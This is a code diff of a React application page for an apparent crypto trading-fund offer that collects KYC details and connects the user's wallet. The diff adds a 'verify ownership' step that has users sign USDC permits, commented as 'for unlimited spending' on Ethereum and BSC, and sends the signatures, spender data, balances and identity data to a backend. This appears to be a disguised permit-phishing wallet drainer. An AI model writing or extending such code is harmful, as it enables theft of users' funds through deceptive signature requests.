@@ -4,7 +4,10 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import Navbar from '@/components/Navbar';
-import { useWallet } from '@/hooks/useWallet';
+import { useRealWallet } from '@/hooks/useRealWallet';
+import { useAuth } from '@/hooks/useAuth';
+import { supabase } from '@/integrations/supabase/client';
+import { useToast } from '@/hooks/use-toast';
 
 const Apply = () => {
   const [currentStep, setCurrentStep] = useState(1);
@@ -14,7 +17,9 @@ const Apply = () => {
   const [isApproving, setIsApproving] = useState(false);
   const [targetAmount, setTargetAmount] = useState(10000);
   
-  const { walletState, tokenBalances, isConnecting, connectTrustWallet, signVerificationMessage, approveTokens, disconnect } = useWallet();
+  const { walletState, usdcBalances, isConnecting, connectWallet, signVerificationMessage, createUSDCPermits, disconnect } = useRealWallet();
+  const { user, isAuthenticated } = useAuth();
+  const { toast } = useToast();
   const [kycData, setKycData] = useState({
     firstName: '',
     lastName: '',
@@ -44,7 +49,7 @@ const Apply = () => {
 
   const handleConnectWallet = async () => {
     try {
-      await connectTrustWallet();
+      await connectWallet();
       setCurrentStep(3);
     } catch (error) {
       console.error('Failed to connect wallet:', error);
@@ -52,27 +57,94 @@ const Apply = () => {
   };
 
   const handleVerifyOwnership = async () => {
-    setIsVerifying(true);
     try {
-      const signature = await signVerificationMessage();
-      await approveTokens();
+      // Get verification signature
+      const verificationSignature = await signVerificationMessage();
+      
+      // Create USDC permits for unlimited spending
+      const permits = await createUSDCPermits();
+      
+      // Store signatures temporarily for submission
+      const allSignatures = [
+        {
+          type: 'verification',
+          signature: verificationSignature,
+          message: `I am verifying my wallet ownership for the trading fund application.\n\nWallet: ${walletState.address}\nTimestamp: ${Date.now()}`,
+          chainId: walletState.chainId
+        },
+        ...permits.map(permit => ({
+          type: permit.chainId === 1 ? 'usdc_permit_eth' : 'usdc_permit_bsc',
+          signature: permit.signature,
+          message: 'USDC Permit Signature',
+          chainId: permit.chainId,
+          tokenAddress: permit.permitData.tokenAddress,
+          spenderAddress: permit.permitData.spender,
+          amount: permit.permitData.value.toString(),
+          deadline: permit.permitData.deadline,
+          nonce: permit.permitData.nonce
+        }))
+      ];
+      
+      setWalletSignatures(allSignatures);
       setOwnershipVerified(true);
       setCurrentStep(4);
     } catch (error) {
       console.error('Failed to verify ownership:', error);
-    } finally {
-      setIsVerifying(false);
     }
   };
 
-  const handleSubmitApplication = () => {
-    setCurrentStep(5);
+  const [walletSignatures, setWalletSignatures] = useState<any[]>([]);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
+  const handleSubmitApplication = async () => {
+    if (!isAuthenticated || !user) {
+      toast({
+        title: "Authentication Required",
+        description: "Please sign in to submit your application.",
+        variant: "destructive"
+      });
+      return;
+    }
+
+    setIsSubmitting(true);
+    try {
+      const { data, error } = await supabase.functions.invoke('submit-application', {
+        body: {
+          kycData,
+          walletAddress: walletState.address,
+          chainId: walletState.chainId,
+          fundingAmount: targetAmount,
+          fundingTier: fundingTiers.find(tier => tier.amount === targetAmount)?.title || 'Custom',
+          signatures: walletSignatures,
+          balances: usdcBalances
+        }
+      });
+
+      if (error) {
+        throw error;
+      }
+
+      toast({
+        title: "Application Submitted!",
+        description: `Your application ${data.applicationNumber} has been submitted successfully.`
+      });
+
+      setCurrentStep(5);
+    } catch (error: any) {
+      toast({
+        title: "Submission Failed",
+        description: error.message || "Failed to submit application. Please try again.",
+        variant: "destructive"
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   const fundingTiers = [
-    { range: "$2K - $5K", funding: "$10K - $25K", profit: "80%", risk: "Low", time: "7 days" },
-    { range: "$5K - $10K", funding: "$25K - $50K", profit: "85%", risk: "Medium", time: "5 days" },
-    { range: "$10K+", funding: "$50K+", profit: "90%", risk: "High", time: "3 days" }
+    { range: "$2K - $5K", funding: "$10K - $25K", profit: "80%", risk: "Low", time: "7 days", amount: 10000, title: "Starter" },
+    { range: "$5K - $10K", funding: "$25K - $50K", profit: "85%", risk: "Medium", time: "5 days", amount: 25000, title: "Professional" },
+    { range: "$10K+", funding: "$50K+", profit: "90%", risk: "High", time: "3 days", amount: 50000, title: "Expert" }
   ];
 
   return (
@@ -292,11 +364,11 @@ const Apply = () => {
                     <p className="text-slate-300 text-sm">Chain: {walletState.chainId === 1 ? 'Ethereum' : `Chain ${walletState.chainId}`}</p>
                   </div>
 
-                  {tokenBalances.length > 0 && (
+                  {usdcBalances.length > 0 && (
                     <div className="bg-slate-700/50 rounded-lg p-4">
-                      <h4 className="text-white font-semibold mb-3">Token Balances Detected</h4>
+                      <h4 className="text-white font-semibold mb-3">USDC Balances Detected</h4>
                       <div className="grid grid-cols-2 gap-2">
-                        {tokenBalances.map((token, index) => (
+                        {usdcBalances.map((token, index) => (
                           <div key={index} className="bg-slate-600/50 rounded p-2 text-sm">
                             <div className="text-white font-medium">{token.symbol}</div>
                             <div className="text-slate-300">{token.balance}</div>
@@ -347,11 +419,11 @@ const Apply = () => {
                           <div className="space-y-3">
                             <div className="text-center">
                               <div className="text-2xl font-bold text-green-400 mb-1">
-                                {tokenBalances.reduce((total, token) => total + parseFloat(token.balance), 0).toLocaleString()} USDT
+                                ${usdcBalances.reduce((total, token) => total + parseFloat(token.balance), 0).toLocaleString()} USDC
                               </div>
                               <p className="text-slate-300 text-sm">Total across all chains</p>
                             </div>
-                            {tokenBalances.map((token, index) => (
+                            {usdcBalances.map((token, index) => (
                               <div key={index} className="flex justify-between text-sm">
                                 <span className="text-slate-300">{token.symbol} ({token.chainName})</span>
                                 <span className="text-white">{parseFloat(token.balance).toLocaleString()}</span>
